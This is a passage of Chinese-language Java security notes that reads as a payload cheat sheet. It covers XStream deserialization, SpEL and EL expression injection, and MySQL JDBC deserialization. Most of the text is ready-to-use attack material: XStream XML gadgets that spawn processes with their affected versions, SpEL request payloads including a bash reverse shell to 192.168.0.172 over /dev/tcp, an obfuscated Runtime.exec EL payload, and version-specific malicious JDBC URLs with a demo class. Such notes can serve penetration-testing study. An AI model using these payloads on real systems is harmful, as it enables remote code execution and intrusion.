                        <string>calc.exe</string>
                    </command>
                </target>
                <action>start</action>
            </handler>
        </dynamic-proxy>
        <string>good</string>
    </entry>
</tree-map>
```

- <=1.4.6
- = 1.4.10
```java
<sorted-set>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>open</string>
                    <string>/System/Applications/Calculator.app</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set>
```

<a name="LusQ0"></a>
### SPEL注入表达式
快速定位parseExpression
```java
    @RequestMapping("/test")
    @ResponseBody
    public String test(String input){
        SpelExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(input);
        return expression.getValue().toString();
    }
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1646445205400-fd7a541e-5edf-48b7-99ae-3453983f9294.png#clientId=ub3083a93-70c9-4&from=paste&height=133&id=u2890bc1d&originHeight=144&originWidth=718&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6481&status=done&style=none&taskId=ua1d980f2-0f7f-4a54-92d2-6463af4d34d&title=&width=661)

```java
http://127.0.0.1:8080/test?input=new%20java.lang.ProcessBuilder("calc").start()
http://localhost:8088/test?input=new java.lang.ProcessBuilder(new String[]{"bash", "-c", "bash -i >& /dev/tcp/192.168.0.172/1234 0>&1"}).start()
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1646444389718-7b439809-4def-4841-bef1-f72d6477274e.png#clientId=ub3083a93-70c9-4&from=paste&height=342&id=ue5252b03&originHeight=683&originWidth=1425&originalType=binary&ratio=1&rotation=0&showTitle=false&size=196087&status=done&style=none&taskId=u7e72630a-913f-47f7-9200-9ed7296862e&title=&width=712.5)

**EL**
```java
https://xxxx.com/login?service=${1000-900}
https://xxxx.com/login?service=${applicationScope} //获取web路径

命令执行payload
#{T(String).forName("ja"+"va.lang.Run"+"time").getMethod("ex"+"ec",T(String[])).invoke(T(String).forName("ja"+"va.lang.Run"+"time").getMethod("getRu"+"ntime").invoke(null),new String[]{"bash", "-c", "calc"})}
```
<a name="sHfOB"></a>
### JDBC反序列化
漏洞版本
```java
ServerStatusDiffInterceptor触发：
8.x:jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc
6.x(属性名不同):jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc
5.1.11及以上的5.x版本（包名没有了cj）:jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc
5.1.10及以下的5.1.X版本： 同上，但是需要连接后执行查询。
5.0.x: 不可用

detectCustomCollations触发：
5.1.41及以上: 不可用
5.1.29-5.1.40:jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc
5.1.28-5.1.19：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=yso_JRE8u20_calc
5.1.18以下的5.1.x版本： 不可用
5.0.x版本不可用
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647826098532-6192344d-027d-4dce-bc1f-a578864ed047.png#clientId=u951535c1-270d-4&from=paste&height=520&id=uf0abf07b&originHeight=693&originWidth=1001&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68845&status=done&style=none&taskId=uad0a3da3-6e21-4a53-a5ee-d6742199037&title=&width=751)

demo
```java
public class test1 {
    public static void main(String[] args) throws Exception{
        String driver = "com.mysql.jdbc.Driver";
        String DB_URL = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc";//8.x使用
        //String DB_URL = "jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc";//5.x使用
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(DB_URL);
    }
}
```
